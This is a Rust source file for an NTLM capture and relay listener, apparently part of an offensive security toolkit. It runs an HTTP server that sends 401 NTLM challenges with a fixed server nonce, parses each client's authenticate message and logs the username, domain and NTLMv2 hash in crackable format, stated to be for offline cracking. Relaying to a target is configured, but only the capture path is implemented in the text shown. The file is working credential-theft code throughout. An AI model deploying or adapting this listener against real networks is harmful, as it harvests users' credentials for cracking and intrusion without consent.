//! # NTLM Relay Listener
//!
//! Listens for incoming HTTP NTLM authentications and relays them
//! to a target SMB/HTTP service. Captures NTLMv2 hashes for offline cracking.

use anyhow::Result;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tracing::{debug, error, info, warn};

/// Captured NTLM hash from a relayed authentication.
#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct CapturedHash {
    /// Source IP of the authenticating client.
    pub client_ip: String,
    /// NTLM username extracted from the Type 3 message.
    pub username: String,
    /// NTLM domain extracted from the Type 3 message.
    pub domain: String,
    /// The full NTLMv2 hash in `user::domain:challenge:nt_proof:blob` format.
    pub hash_string: String,
}

/// NTLM Relay server configuration.
#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct RelayConfig {
    /// Address to bind the HTTP listener (e.g., "0.0.0.0:80").
    pub bind_addr: String,
    /// Target to relay authentication to (e.g., "192.168.1.10:445").
    pub relay_target: Option<String>,
    /// Whether to only capture hashes (no relay).
    pub capture_only: bool,
}

impl Default for RelayConfig {
    fn default() -> Self {
        Self {
            bind_addr: "0.0.0.0:80".to_string(),
            relay_target: None,
            capture_only: true,
        }
    }
}

/// NTLM Relay server — HTTP listener that triggers NTLM authentication
/// and captures/relays the resulting credentials.
#[allow(dead_code)]
pub struct RelayServer {
    config: RelayConfig,
    captured: std::sync::Arc<tokio::sync::Mutex<Vec<CapturedHash>>>,
}

#[allow(dead_code)]
impl RelayServer {
    pub fn new(config: RelayConfig) -> Self {
        Self {
            config,
            captured: std::sync::Arc::new(tokio::sync::Mutex::new(Vec::new())),
        }
    }

    /// Create a capture-only relay on the given address.
    pub fn capture_only(bind_addr: &str) -> Self {
        Self::new(RelayConfig {
            bind_addr: bind_addr.to_string(),
            relay_target: None,
            capture_only: true,
        })
    }

    /// Get all captured hashes so far.
    pub async fn captured_hashes(&self) -> Vec<CapturedHash> {
        self.captured.lock().await.clone()
    }

    /// Start the relay listener. This runs forever until cancelled.
    pub async fn start(&self) -> Result<()> {
        info!(
            "Relay: Starting NTLM {} listener on {}...",
            if self.config.capture_only { "capture" } else { "relay" },
            self.config.bind_addr
        );

        let listener = TcpListener::bind(&self.config.bind_addr).await?;
        info!("Relay: Listening for incoming HTTP connections");

        loop {
            let (socket, addr) = listener.accept().await?;
            debug!("Relay: Connection from {addr}");

            let captured = self.captured.clone();
            let client_ip = addr.ip().to_string();

            tokio::spawn(async move {
                if let Err(e) = handle_http_ntlm(socket, &client_ip, captured).await {
                    debug!("Relay: Connection handler error for {addr}: {e}");
                }
            });
        }
    }
}

/// Handle a single HTTP connection, triggering NTLM auth via 401 challenges.
async fn handle_http_ntlm(
    stream: TcpStream,
    client_ip: &str,
    captured: std::sync::Arc<tokio::sync::Mutex<Vec<CapturedHash>>>,
) -> Result<()> {
    let (reader, mut writer) = stream.into_split();
    let mut buf_reader = BufReader::new(reader);

    // Read the HTTP request line + headers
    let mut request_line = String::new();
    buf_reader.read_line(&mut request_line).await?;
    debug!("Relay: Request: {}", request_line.trim());

    let mut authorization = None;
    let mut line = String::new();
    loop {
        line.clear();
        let n = buf_reader.read_line(&mut line).await?;
        if n == 0 || line.trim().is_empty() {
            break;
        }
        if let Some(rest) = line.strip_prefix("Authorization: ") {
            authorization = Some(rest.trim().to_string());
        }
    }

    match authorization {
        None => {
            // No auth header → send 401 with NTLM challenge
            debug!("Relay: No auth from {client_ip} — sending 401 NTLM challenge");
            let response = "HTTP/1.1 401 Unauthorized\r\n\
                            WWW-Authenticate: NTLM\r\n\
                            Content-Length: 0\r\n\
                            Connection: keep-alive\r\n\
                            \r\n";
            writer.write_all(response.as_bytes()).await?;
        }
        Some(auth) if auth.starts_with("NTLM ") => {
            let b64_data = &auth[5..];
            match base64_decode(b64_data) {
                Ok(ntlm_bytes) => {
                    if ntlm_bytes.len() < 12 {
                        warn!("Relay: NTLM message too short from {client_ip}");
                        send_401_ntlm(&mut writer).await?;
                        return Ok(());
                    }

                    let msg_type = u32::from_le_bytes([
                        ntlm_bytes[8],
                        ntlm_bytes[9],
                        ntlm_bytes[10],
                        ntlm_bytes[11],
                    ]);

                    match msg_type {
                        1 => {
                            // Type 1 (Negotiate) → respond with Type 2 (Challenge)
                            debug!("Relay: NTLM Type 1 from {client_ip} — sending Type 2 challenge");
                            let challenge = build_ntlm_type2_challenge();
                            let b64_challenge = base64_encode(&challenge);
                            let response = format!(
                                "HTTP/1.1 401 Unauthorized\r\n\
                                 WWW-Authenticate: NTLM {b64_challenge}\r\n\
                                 Content-Length: 0\r\n\
                                 Connection: keep-alive\r\n\
                                 \r\n"
                            );
                            writer.write_all(response.as_bytes()).await?;
                        }
                        3 => {
                            // Type 3 (Authenticate) → extract credentials
                            debug!("Relay: NTLM Type 3 from {client_ip} — extracting hash");
                            match extract_type3_info(&ntlm_bytes) {
                                Ok((username, domain, hash_str)) => {
                                    let hash = CapturedHash {
                                        client_ip: client_ip.to_string(),
                                        username: username.clone(),
                                        domain: domain.clone(),
                                        hash_string: hash_str.clone(),
                                    };

                                    info!(
                                        "Relay: ✓ Captured NTLMv2 hash — {}\\{} from {}",
                                        domain, username, client_ip
                                    );
                                    info!("Relay: Hash: {hash_str}");

                                    captured.lock().await.push(hash);

                                    // Send 200 OK
                                    let response = "HTTP/1.1 200 OK\r\n\
                                                    Content-Length: 0\r\n\
                                                    Connection: close\r\n\
                                                    \r\n";
                                    writer.write_all(response.as_bytes()).await?;
                                }
                                Err(e) => {
                                    error!("Relay: Failed to parse Type 3 from {client_ip}: {e}");
                                    send_401_ntlm(&mut writer).await?;
                                }
                            }
                        }
                        other => {
                            warn!("Relay: Unknown NTLM message type {other} from {client_ip}");
                            send_401_ntlm(&mut writer).await?;
                        }
                    }
                }
                Err(e) => {
                    warn!("Relay: Invalid base64 from {client_ip}: {e}");
                    send_401_ntlm(&mut writer).await?;
                }
            }
        }
        Some(_) => {
            // Non-NTLM auth → send 401
            debug!("Relay: Non-NTLM auth from {client_ip} — sending 401");
            send_401_ntlm(&mut writer).await?;
        }
    }

    Ok(())
}

/// Send a 401 response requesting NTLM authentication.
async fn send_401_ntlm(writer: &mut tokio::net::tcp::OwnedWriteHalf) -> Result<()> {
    let response = "HTTP/1.1 401 Unauthorized\r\n\
                    WWW-Authenticate: NTLM\r\n\
                    Content-Length: 0\r\n\
                    Connection: keep-alive\r\n\
                    \r\n";
    writer.write_all(response.as_bytes()).await?;
    Ok(())
}

/// Build a minimal NTLM Type 2 (Challenge) message.
///
/// This is a simplified challenge with a fixed server nonce.
/// In a real relay scenario, this challenge would be forwarded from the target.
fn build_ntlm_type2_challenge() -> Vec<u8> {
    let mut msg = Vec::with_capacity(56);

    // Signature: "NTLMSSP\0"
    msg.extend_from_slice(b"NTLMSSP\0");
    // Message Type: 2 (Challenge)
    msg.extend_from_slice(&2u32.to_le_bytes());
    // Target Name (empty security buffer): len=0, maxlen=0, offset=56
    msg.extend_from_slice(&0u16.to_le_bytes()); // len
    msg.extend_from_slice(&0u16.to_le_bytes()); // max len
    msg.extend_from_slice(&56u32.to_le_bytes()); // offset
    // Negotiate Flags
    let flags: u32 = 0x00008215 // UNICODE | OEM | REQUEST_TARGET | NTLM | ALWAYS_SIGN
        | 0x00080000  // EXTENDED_SESSIONSECURITY
        | 0x00800000  // TARGET_INFO
        | 0x20000000  // NEGOTIATE_128
        | 0x40000000; // KEY_EXCH
    msg.extend_from_slice(&flags.to_le_bytes());
    // Server Challenge (8 bytes — random in production, fixed for capture)
    msg.extend_from_slice(&[0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);
    // Reserved (8 bytes)
    msg.extend_from_slice(&[0u8; 8]);
    // Target Info (empty security buffer): len=0, maxlen=0, offset=56
    msg.extend_from_slice(&0u16.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    msg.extend_from_slice(&56u32.to_le_bytes());

    msg
}

/// Extract username, domain, and hash string from an NTLM Type 3 message.
fn extract_type3_info(data: &[u8]) -> Result<(String, String, String)> {
    if data.len() < 72 {
        anyhow::bail!("Type 3 message too short ({} bytes)", data.len());
    }

    // Parse security buffer fields
    // LM Response: offset 12
    // NT Response: offset 20
    let nt_len = u16::from_le_bytes([data[20], data[21]]) as usize;
    let nt_off = u32::from_le_bytes([data[24], data[25], data[26], data[27]]) as usize;

    // Domain: offset 28
    let domain_len = u16::from_le_bytes([data[28], data[29]]) as usize;
    let domain_off = u32::from_le_bytes([data[32], data[33], data[34], data[35]]) as usize;

    // User: offset 36
    let user_len = u16::from_le_bytes([data[36], data[37]]) as usize;
    let user_off = u32::from_le_bytes([data[40], data[41], data[42], data[43]]) as usize;

    // Extract domain name (UTF-16LE)
    let domain = if domain_off + domain_len <= data.len() {
        decode_utf16le(&data[domain_off..domain_off + domain_len])
    } else {
        "UNKNOWN".to_string()
    };

    // Extract username (UTF-16LE)
    let username = if user_off + user_len <= data.len() {
        decode_utf16le(&data[user_off..user_off + user_len])
    } else {
        "UNKNOWN".to_string()
    };

    // Extract NT response for hash string
    let nt_hash_str = if nt_off + nt_len <= data.len() && nt_len >= 16 {
        let nt_response = &data[nt_off..nt_off + nt_len];
        let nt_proof = hex::encode(&nt_response[..16]);
        let blob = hex::encode(&nt_response[16..]);
        // Standard challenge from our Type 2
        let challenge = "1122334455667788";
        // Format: username::domain:challenge:nt_proof:blob
        format!("{username}::{domain}:{challenge}:{nt_proof}:{blob}")
    } else {
        format!("{username}::{domain}:no_nt_response")
    };

    Ok((username, domain, nt_hash_str))
}

/// Decode UTF-16LE bytes to a Rust String.
fn decode_utf16le(data: &[u8]) -> String {
    let u16s: Vec<u16> = data
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    String::from_utf16_lossy(&u16s)
}

/// Simple base64 decode (no external dependency needed — use built-in).
fn base64_decode(input: &str) -> Result<Vec<u8>> {
    // Minimal base64 decoder for NTLM tokens
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let input = input.trim();
    let mut output = Vec::with_capacity(input.len() * 3 / 4);
    let mut buf: u32 = 0;
    let mut bits: u32 = 0;

    for &b in input.as_bytes() {
        if b == b'=' {
            break;
        }
        let val = CHARS.iter().position(|&c| c == b);
        let val = match val {
            Some(v) => v as u32,
            None => continue, // skip whitespace
        };
        buf = (buf << 6) | val;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            output.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }

    Ok(output)
}

/// Simple base64 encode.
fn base64_encode(input: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::with_capacity((input.len() + 2) / 3 * 4);

    for chunk in input.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;

        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }

    result
}
